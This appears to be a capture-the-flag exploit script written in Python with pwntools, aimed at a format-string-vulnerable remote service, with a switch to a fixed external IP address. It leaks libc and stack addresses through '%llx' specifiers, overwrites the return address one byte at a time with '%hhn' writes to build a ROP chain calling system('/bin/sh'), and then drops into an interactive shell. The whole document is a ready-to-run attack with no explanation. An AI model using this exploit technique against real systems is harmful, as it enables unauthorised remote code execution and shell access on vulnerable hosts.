from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "20.48.81.63"
    port = 20002
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)
recvuntil('\______/ |__/|__/\n')

sendline('%llx %llx %llx %llx %llx %llx')
recvline()
ls = recvline().split(' ')
print(ls)
libc = int(ls[2], 16) - 0x108cb2
stack = int(ls[3], 16)

pop_rdi = libc + 0x0002858f
binsh = libc + 0x1ae41f
system = libc + 0x503c0

def write(addr, val):
    if val == 0:
        return
    s = '%{}c%10$hhn'.format(val)
    s += ' ' * (16 - len(s))
    s += p64(addr)
    sendline(s)

write(stack-1, 0xff)

ret_addr = stack + 0x38

payload = [
        pop_rdi + 1,
        pop_rdi,
        binsh,
        system
        ]
payload = ''.join(map(p64, payload))

for i, c in enumerate(payload):
    write(ret_addr + i, ord(c))

wait_for_attach()
write(stack - 1, 1)

interactive()

